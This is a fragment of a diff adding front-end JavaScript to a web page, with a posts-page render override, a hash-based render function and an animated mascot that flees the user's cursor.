+pagePosts = function(){
+  const html = _origPagePosts();
+  return html.replace(`onclick="render()"`, `onclick="refreshPostsAnimated()"`);
+};
+
+applyModeClass();
+logRequest({method:"GET", path:"/ui/posts", headers:{Accept:"text/html"}, status:200, note:"page load"});
+
+function render(){
+  renderHeader();
+  const {fn, params, query} = parseHash();
+  const html = fn({params, query});
+  document.getElementById("main").innerHTML = html;
+  // Auto-scroll to top of main on nav (not on partial refresh)
+  window.scrollTo({top:0, behavior:"instant"});
+}
+render();
+
+/* ============================================================
+   MASCOT (flees from cursor)
+============================================================ */
+(() => {
+  const mascot = document.getElementById('anime-mascot');
+  if(!mascot || matchMedia('(prefers-reduced-motion: reduce)').matches) return;
+  let pointerX = innerWidth*0.75, pointerY = innerHeight*0.35;
+  let currentX = innerWidth-86, currentY = 112;
+  let velocityX = 0, velocityY = 0;
+  let wanderAngle = Math.random()*Math.PI*2;
+  let wanderTargetX = currentX, wanderTargetY = currentY;
+  const clamp=(v,a,b)=>Math.min(b,Math.max(a,v));
+  const rand=(a,b)=>a+Math.random()*(b-a);
+  const updateWander=()=>{
+    wanderAngle += rand(-0.9,0.9);
+    const d = rand(30,130);
+    wanderTargetX = clamp(currentX+Math.cos(wanderAngle)*d, 16, innerWidth-70);
+    wanderTargetY = clamp(currentY+Math.sin(wanderAngle)*d, 80, innerHeight-70);
+  };
+  setInterval(updateWander, 1200);
+  addEventListener('pointermove', e=>{ pointerX=e.clientX; pointerY=e.clientY; });
+  addEventListener('resize', ()=>{ currentX=clamp(currentX,16,innerWidth-70); currentY=clamp(currentY,80,innerHeight-70); });
+  function tick(){
+    const cx = currentX+28, cy = currentY+28;
+    const dx = cx-pointerX, dy = cy-pointerY;
+    const dist = Math.hypot(dx,dy);
+    let ax=0, ay=0;
+    if(dist < 220){
+      const f = (220-dist)/220 * 0.9;
+      ax += (dx/(dist||1))*f; ay += (dy/(dist||1))*f;
+    }
+    ax += (wanderTargetX-currentX)*0.0025;
+    ay += (wanderTargetY-currentY)*0.0025;
+    velocityX = (velocityX+ax)*0.92;
+    velocityY = (velocityY+ay)*0.92;
+    currentX = clamp(currentX+velocityX, 16, innerWidth-70);
+    currentY = clamp(currentY+velocityY, 80, innerHeight-70);
+    mascot.style.left = currentX+"px";
+    mascot.style.top  = currentY+"px";
+    requestAnimationFrame(tick);
+  }
+  requestAnimationFrame(tick);
+})();
+</script>
+</body>
+</html>
